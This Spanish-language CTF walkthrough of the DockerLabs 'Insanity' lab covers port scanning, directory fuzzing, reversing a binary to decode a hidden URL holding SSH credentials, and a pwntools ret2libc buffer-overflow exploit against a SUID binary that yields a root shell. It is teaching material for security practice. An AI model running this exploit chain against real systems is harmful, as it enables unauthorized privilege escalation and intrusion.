![Screenshot](/hard/Insanity/Images/machine.png)

Dificultad: **Hard**

Hecho por: **maciiii__**

# Pasos para pwn 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de Privilegios](#escalada-de-privilegios)

---

## 🛠️  Técnicas: Enumeración con gobuster, análisis de un binario compilado con ghidra, creación de nuestro propio exploit para acceder a una URL y obtener credenciales, escalada de privilegios usando ret2libc

---

Primero que nada nos aseguramos de que la máquina esté activa, podemos verificarlo rápidamente con el comando **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.228 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.082 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.134 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2029ms
rtt min/avg/max/mdev = 0.082/0.148/0.228/0.060 ms
```

Ahora, podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Siempre comenzamos con **nmap** para saber qué puertos están abiertos en la máquina objetivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 15:53 -0500
Initiating ARP Ping Scan at 15:53
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:53, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:53
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:53, 2.65s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2026-01-12 15:53:25 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.06 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le decimos a nmap que escanee todos los puertos, comenzando desde el puerto 1 hasta el puerto 65,535.

**-n** <- Con este argumento nmap va a omitir la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.

**-sS** <- Con este argumento nmap va a realizar un escaneo sigiloso, esto significa que el 3-way-handshake no se completará, y también hace el escaneo un poco más rápido.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.

**-Pn** <- Con este argumento nmap también omitirá la fase de descubrimiento de host, esto significa que nmap tratará la máquina como activa y hará el escaneo inmediatamente.

**-vv** <- Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, esto significa que si nmap descubre un puerto abierto inmediatamente nos lo reportará mientras el escaneo continúa.

**--open** <- Con este argumento le estamos diciendo a nmap que solo filtre los puertos abiertos.

Una vez que el escaneo concluye podemos ver 2 puertos abiertos:

- puerto 22 (ssh / Secure Shell)
- puerto 80 (http / Hyper-Text Transfer Protocol)

Pero necesitamos saber más sobre estos puertos, como qué versiones y servicios están ejecutándose, podemos usar una vez más **nmap** para descubrir esto por nosotros.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- Con este argumento nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento nmap va a escanear por cada puerto su versión para encontrar algunas posibles vulnerabilidades sobre sistemas no actualizados, y también hacer un escaneo con algunos scripts que ejecuta nmap, para encontrar más sobre estos puertos.

**-oX target** <- Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.

Después de que el escaneo termine obtuvimos la salida en un archivo xml, hacemos esto para crear una página html para ver la información más fácilmente y más agradable a la vista.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo xml a un archivo html, ahora vamos a abrirlo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador.

![Screenshot](/hard/Insanity/Images/image1.png)

Como podemos ver es mucho más bonito y legible a la vista.

Y podemos ver que el puerto 80 es un sitio web, y está tratando de redireccionarnos a **insanity.dl**.

Así que esto está aplicando virtual hosting, y necesitamos poner ese dominio en el archivo **/etc/hosts**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ head -n1 /etc/hosts
172.17.0.2      insanity.dl
```

Bien, voy a usar **whatweb** para saber qué tecnologías usa este sitio web, esto es útil para tratar de encontrar versiones vulnerables en la página.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ whatweb http://insanity.dl
http://insanity.dl [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[Apache2 Debian Default Page: It works]
```

Y podemos ver que usa apache, pero nada más interesante.

Así que vamos a abrir el sitio web con nuestro navegador.

![Screenshot](/hard/Insanity/Images/image2.png)

Podemos ver que es una página por defecto, podemos intentar echar un vistazo al código fuente de esta página con **CTRL + U**

```r
<!-- Subdominio?? -->
<!-- Tal vez fuzzing??? -->
<!-- O capaz ninguno... -->
```

Podemos ver estos comentarios, probablemente necesitemos usar algo de fuzzing en este sitio web.

---
# Enumeración

Después de un largo tiempo haciendo enumeración con **gobuster** solo podemos encontrar algo interesante en la lista grande de Discovery en **SecLists**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/enumeration]
└─$ gobuster dir -u http://insanity.dl -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://insanity.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 315] [--> http://insanity.dl/javascript/]
/server-status        (Status: 403) [Size: 276]
/tinyp                (Status: 301) [Size: 310] [--> http://insanity.dl/tinyp/]
Progress: 1273830 / 1273830 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos **tinyp** en el sitio web, vamos a echar un vistazo con el navegador.

![Screenshot](/hard/Insanity/Images/image3.png)

Podemos ver estos 2 archivos, así que vamos a descargarlos.

Genial, podemos ver el tipo de archivo de estos archivos con el comando **file**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/files]
└─$ file secret 
secret: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7fea577c19494e6f2007cafb058b4a6a83db0ebc, for GNU/Linux 4.4.0, not stripped
```

Bien ahora, vamos a intentar hacer algo de ingeniería inversa con **Ghidra**

---
# Explotación

Después de un poco de análisis del binario **secret** parece que está usando **libcredenciales.so**

Podemos hacer lo mismo con esta librería, y analizarla con **Ghidra**

Después de un poco de análisis a esta librería, usa 3 funciones (g, b, a) que son muy importantes.

La función **G** es la siguiente:

```c
void g(void)

{
  long in_FS_OFFSET;
  undefined1 auStack_528 [40];
  undefined8 uStack_500;
  undefined4 local_4f4;
  undefined8 local_4f0;
  undefined1 *local_4e8;
  char *file;
.........
  local_440 = 0xb;
  local_43c = 0xd;
  local_438 = 1;
  local_4f4 = 0x29;
  local_4f0 = 0x29;
  local_4e8 = auStack_528;
  b(&local_4d8,0x29,auStack_528);
  file = "2334645634646.txt";
  snprintf(all_command,0x200,"%s/%s",local_4e8,"2334645634646.txt");
  snprintf(command,0x200,"wget \'%s\'",all_command);
  system(command);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    uStack_500 = 0x1014c5;
    __stack_chk_fail();
  }
  return;
}
```

Con esta función G estamos pasando una variable, que es muy larga a la función **B**, y después de todo eso el sistema ejecuta un **comando** que usa wget, y un archivo.

- **wget ???/2334645634646.txt**

Parece que está descargando un archivo del sitio web, ahora veamos qué hace la función **B**

```c
void b(long param_1,int param_2,long param_3)

{
  undefined1 final_maybe;
  undefined4 i;
  
  for (i = 0; i < param_2; i = i + 1) {
    final_maybe = a(*(undefined4 *)(param_1 + (long)i * 4));
    *(undefined1 *)(i + param_3) = final_maybe;
  }
  *(undefined1 *)(param_3 + param_2) = 0;
  return;
}
```

Esta función **B** recibe un array y pasa cada elemento del array a la función **A**

```c
int a(int param_1)

{
  if ((param_1 < 1) || (0x1a < param_1)) {
    if (param_1 == 0x1b) {
                    /* This replaces to : */
      param_1 = 0x3a;
    }
    else if (param_1 == 0x1c) {
                    /* This replaces to / */
      param_1 = 0x2f;
    }
    else if (param_1 == 0x1d) {
                    /* This replaces to . */
      param_1 = 0x2e;
    }
    else if (param_1 == 0x1e) {
                    /* This replaces to _ */
      param_1 = 0x5f;
    }
    else {
                    /* This replaces to ? */
      param_1 = 0x3f;
    }
  }
  else {
    param_1 = param_1 + 0x60;
  }
  return param_1;
}
```

La función **A** recibe un parámetro que es un valor **int**, solo un número, y luego devuelve el valor del **param_1** en un valor hexadecimal, especialmente caracteres como ves en los comentarios, esto parece ser una URL o algo así.

Así que en resumen todas estas funciones hacen esto:

la función **G** pasa un array a la función **B** y esta función obtiene cada elemento del array y luego pasa un elemento a la función **A** y esta función trata el elemento recibido y dependiendo del número de este elemento está siendo reemplazado por un carácter, y después de hacer todo esto parece que recibimos una **URL** completa y luego la función **G** descarga el contenido de un archivo, con **wget** desde esta nueva **URL**.

Te preguntarás cuál es el array.

Es de esta variable: **local_4d8** <- Este es el array, y todos sus valores continúan hasta: **local_438**

Podemos usar **Ghidra** para convertir estos números hexadecimales a números decimales comunes.

```r
  local_4d8 = 8;
  local_4d4 = 20;
  local_4d0 = 20;
  local_4cc = 16;
  local_4c8 = 27;
  local_4c4 = 28;
  local_4c0 = 28;
  local_4bc = 9;
  local_4b8 = 14;
  local_4b4 = 19;
  local_4b0 = 1;
  local_4ac = 14;
  local_4a8 = 9;
  local_4a4 = 20;
  local_4a0 = 25;
  local_49c = 29;
  local_498 = 4;
  local_494 = 12;
  local_490 = 28;
  local_48c = 21;
  local_488 = 12;
  local_484 = 20;
  local_480 = 18;
  local_47c = 1;
  local_478 = 30;
  local_474 = 19;
  local_470 = 5;
  local_46c = 3;
  local_468 = 18;
  local_464 = 5;
  local_460 = 20;
  local_45c = 30;
  local_458 = 6;
  local_454 = 15;
  local_450 = 12;
  local_44c = 4;
  local_448 = 5;
  local_444 = 18;
  local_440 = 11;
  local_43c = 13;
  local_438 = 1;
```

Este es todo el array y sus elementos, podemos usar esto y guardarlo en un archivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/exploits]
└─$ cat all_nums | awk '{print $3}' | tr -d ';' | sponge all_nums
```

este comando solo muestra los números y elimina el **;** y lo guarda una vez más en el mismo archivo.

Bien, voy a hacer un script con python para mostrarnos la URL final.

```python
def a(param_1):
	if param_1 < 1 or 0x1a < param_1:
		if param_1 == 0x1b:
			param_1 = 0x3a
    
		elif param_1 == 0x1c:
			param_1 = 0x2f
    
		elif param_1 == 0x1d:
			param_1 = 0x2e
    
		elif param_1 == 0x1e:
			param_1 = 0x5f
    
		else:
			param_1 = 0x3f
    
	else:
	    param_1 = param_1 + 0x60
  
	return param_1

def b(all_nums):
	final = ""

	for num in all_nums: final += chr(a(num))

	print(f"[!] URL -> {final}")

if __name__ == "__main__":
	all_nums = []

	with open("all_nums") as file:
        	for line in file: all_nums.append(int(line))

	b(all_nums)
```

Para entender mejor qué hace este decodificador voy a hacer un diagrama con **excalidraw**

![Screenshot](/hard/Insanity/Images/image4es.png)

Bien, espero que puedas entenderlo mejor con esto, ahora, vamos a usar el decodificador y ver si funciona.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/exploits]
└─$ python3 decoder.py 
[!] URL -> http://insanity.dl/ultra_secret_folderkma
```

¡Y obtuvimos esta url! vamos a echar un vistazo con nuestro navegador.

![Screenshot](/hard/Insanity/Images/image5.png)

Podemos ver aquí un archivo txt, ahora veamos cuál es su contenido.

```r
Credenciales de ssh

maci:CrACkEd
```

¡Obtuvimos las credenciales del usuario **maci**!

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/exploits]
└─$ ssh maci@172.17.0.2         
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:zOTAn0lMEH6FLmjGfiZKtPWMT3yvU1VE4gcdNC/u0AI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
maci@172.17.0.2's password: 
Linux dockerlabs 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 12 23:10:17 2026 from 172.17.0.1
maci@dockerlabs:~$
```

¡Estamos dentro!

---
# Escalada de Privilegios

Después de un poco de tiempo podemos ver que existe un archivo que tiene un permiso de **SUID**

```r
maci@dockerlabs:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/sudo
/opt/vuln
```

Podemos ver un archivo **vuln** en el directorio **/opt/**, podemos ver que el propietario de este binario es el usuario **root**

```r
maci@dockerlabs:~$ ls -l /opt/vuln 
-r-sr-xr-x 1 root root 16080 Jan 21  2025 /opt/vuln
```

Vamos a ejecutar este programa y ver qué pasa.

```r
maci@dockerlabs:/opt$ ./vuln 
Escribe tu nombre: craft
```

Solo podemos ver esto, vamos a ingresar muchos datos como cientos de As

```r
maci@dockerlabs:/opt$ ./vuln 
Escribe tu nombre: AAAAAAAAAAAAAAAAAAAAAAAAA....
Segmentation fault
```

Podemos ver un Buffer Overflow, vamos a intentar descargar este binario a nuestra máquina de ataque, haciendo el servidor con **python** y descargándolo con **wget**

```r
maci@dockerlabs:/opt$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Bien, ahora vamos a descargar el binario **vuln**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/files]
└─$ wget http://172.17.0.2:100/vuln
--2026-01-12 18:18:45--  http://172.17.0.2:100/vuln
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16080 (16K) [application/octet-stream]
Saving to: 'vuln'

vuln                                                        100%[==================================================>]  15.70K  --.-KB/s    in 0s      

2026-01-12 18:18:45 (309 MB/s) - 'vuln' saved [16080/16080]
```

Ahora vamos a ejecutar este programa en nuestro sistema con **gdb** para ver más qué pasa a bajo nivel

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/files]
└─$ gdb -q vuln 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from vuln...
(No debugging symbols found in vuln)
```

Bien, ahora vamos a ejecutar el programa simplemente escribiendo **R**

```r
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/insanity/files/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Escribe tu nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....
```

Ahora vamos a ingresar muchas As y ver qué pasa.

Y podemos ver esto:

![Screenshot](/hard/Insanity/Images/image6.png)

Podemos ver que sobrescribimos otros registros en este binario, haciendo un desbordamiento en el buffer.

Podemos ver qué protecciones está usando este binario con **checksec**

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/insanity/files/vuln'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Podemos ver que solo la protección NX (Not Executable) está activada, esto significa que no podemos ejecutar shellcode en la pila.

Así que necesitamos hacer un exploit con **ret2libc**, necesitamos conocer las direcciones del comando **system** en el binario, **sh** para obtener una shell, **pop rdi** para insertar la cadena sh en este registro.

Esta técnica básicamente redirige el flujo del programa para ejecutar funciones en la librería C **libc**, como system.

Así que estamos "ejecutando" código sin inyectar shellcode, solo le estamos diciendo al programa qué hacer y por consecuencia recibimos una shell como el usuario **root** si recuerdas el propietario de este binario.

Y necesitamos usar gadgets como dije antes (pop rdi) para insertar la cadena de **sh** y dejar que system ejecute esta cadena.

Pero antes de hacer eso necesitamos asegurarnos de qué tipo de **ASLR** (Address Space Layout Randomization) está usando esta máquina.

Existen 3 estados en ASLR que pueden ser configurados.

- 0 (Deshabilitado, sin aleatorización en la memoria)
- 1 (Aleatorización Parcial, Aleatoriza librerías compartidas, pila, etc...)
- 2 (Aleatorización Completa, todas las direcciones pueden ser completamente aleatorias)

Para verificar qué usa este sistema podemos verificarlo en la máquina objetivo en el archivo **randomize_va_space** esto nos muestra el número que está usando este sistema.

```r
maci@dockerlabs:/opt$ cat /proc/sys/kernel/randomize_va_space 
0
```

Podemos ver que es 0, así que está completamente deshabilitado, esto significa que todas las direcciones van a ser estáticas.

Así que necesitamos hacer un exploit en python para obtener una shell como el usuario root, podemos verificar si en la máquina objetivo está instalada la librería **pwntools**.

```r
maci@dockerlabs:/opt$ python3
Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>>
```

Y podemos ver que pwntools está en el sistema.

Así que ahora podemos empezar a hacer nuestro exploit y extraer todas las cosas necesarias.

Necesitamos obtener el offset de **RSP** y dirigir el flujo del programa, podemos usar patrones para obtener el offset de este registro, estoy usando **gef**, es como un plugin para **GDB**, puedes instalarlo [aquí](https://github.com/hugsy/gef)

```r
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaa.....
[+] Saved as '$_gef0'
```

Vamos a copiar esta cadena y ejecutar una vez más el binario, e ingresar todo esto.

![Screenshot](/hard/Insanity/Images/image7.png)

Ahora podemos obtener el offset de **RSP** con el siguiente comando:

```r
gef➤  pattern offset $rsp
[+] Searching for '7261616161616161'/'6161616161616172' with period=8
[+] Found at offset 136 (little-endian search) likely
```

Encontramos que el offset de **RSP** es **136**

Para conocer la dirección del gadget **pop rdi** podemos usar **ropper**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/files]
└─$ ropper --file vuln --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: vuln
0x000000000040116a: pop rdi; nop; pop rbp; ret;
```

Encontramos la dirección del **pop rdi** y también un **pop rbp** esto es importante saber, podemos llenarlo con un byte nulo y en el pop rdi ingresar la dirección de la cadena sh.

Ahora, vamos a encontrar la dirección de la función system, podemos usar en la máquina objetivo **gdb** así que solo necesitamos hacer esto:

```r
maci@dockerlabs:/opt$ gdb -q vuln 
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) b *main
Breakpoint 1 at 0x40118a
```

Vamos a hacer un **breakpoint** en la función main para pausar el programa cuando el binario llame a la función **main**.

Ahora vamos a ejecutar el programa

```r
(gdb) r
Starting program: /opt/vuln 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x000000000040118a in main ()
```

Y para encontrar system es simplemente hacer esto:

```r
(gdb) p system
$1 = {int (const char *)} 0x7ffff7e27490 <__libc_system>
```

Y encontramos la dirección de system.

Y para encontrar la dirección de la cadena **/bin/sh** es un poco diferente.

```r
(gdb) find &system,+9999999,"/bin/sh"
0x7ffff7f71031
warning: Unable to access 16000 bytes of target memory at 0x7ffff7fbb3b9, halting search.
1 pattern found.
```

Genial, así que obtuvimos la dirección de **/bin/sh** si quieres verificarlo, puedes ingresar el siguiente comando:

```r
(gdb) x/s 0x7ffff7f71031
0x7ffff7f71031: "/bin/sh"
```

Bien, tenemos todo lo necesario así que podemos hacer nuestro propio exploit con **pwntools**.

```python
from pwn import *

def exploit():
    load = ELF("/opt/vuln")
    prc = process("/opt/vuln")

    offset = 136
    
    # 0x000000000040116a: pop rdi; nop; pop rbp; ret;
    # 0x7ffff7e27490: system
    # 0x7ffff7f71031: /bin/sh

    pop_rdi = p64(0x40116a)
    sys_addr = p64(0x7ffff7e27490)
    sh_addr = p64(0x7ffff7f71031)
    null = p64(0x0)

    payload = b"A"*offset + pop_rdi + sh_addr + null + sys_addr

    prc.sendafter(b"nombre: ", payload)
    prc.interactive()

if __name__ == "__main__":
    exploit()
```

Voy a hacer un diagrama con **excalidraw** una vez más para entender mejor qué hace este exploit.

![Screenshot](/hard/Insanity/Images/image8es.png)

Bien, así que transferimos este exploit a la máquina objetivo con **scp** porque tenemos la contraseña del usuario **maci**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insanity/exploits]
└─$ scp exploit.py maci@172.17.0.2:/tmp
maci@172.17.0.2's password: 
exploit.py
```

Transferimos el archivo al directorio **/tmp/**.

Así que ahora vamos a ejecutar el exploit.

```r
maci@dockerlabs:/tmp$ python3 exploit.py 
[*] '/opt/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/opt/vuln': pid 161
[*] Switching to interactive mode
$ 
$ id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(maci)
$ whoami
root
```

¡Ahora somos root! ***...pwned..!***
